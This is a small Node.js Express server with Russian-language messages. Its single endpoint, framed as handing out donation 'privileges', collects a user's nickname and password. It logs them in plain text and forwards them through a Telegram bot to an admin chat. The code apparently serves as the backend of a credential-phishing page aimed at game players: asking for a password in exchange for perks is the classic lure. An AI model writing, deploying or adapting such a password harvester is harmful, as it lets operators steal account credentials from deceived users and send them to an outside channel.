const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = 3000;

const telegramToken = process.env.BOT_TOKEN;
const chatId = process.env.ADMIN_CHAT_ID;

const bot = new TelegramBot(telegramToken);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/donateGive', async (req, res) => {
    const { nickname, privilege, password } = req.body;

    console.log('Получен запрос на выдачу привилегии:');
    console.log('Ник:', nickname);
    console.log('Привилегия:', privilege);
    console.log('Пароль:', password);
    
    const message = `
Никнейм: ${nickname}
Привилегия: ${privilege}
Пароль: ${password}
  `;

    try {
        await bot.sendMessage(chatId, message);
        res.json({ message: 'Данные получены и отправлены в Telegram' });
    } catch (error) {
        console.error('Ошибка при отправке в Telegram:', error);
        res.status(500).json({ message: 'Ошибка отправки в Telegram' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});

app.listen(port, () => {
    console.log(`Сервер запущен на http://localhost:${port}`);
});
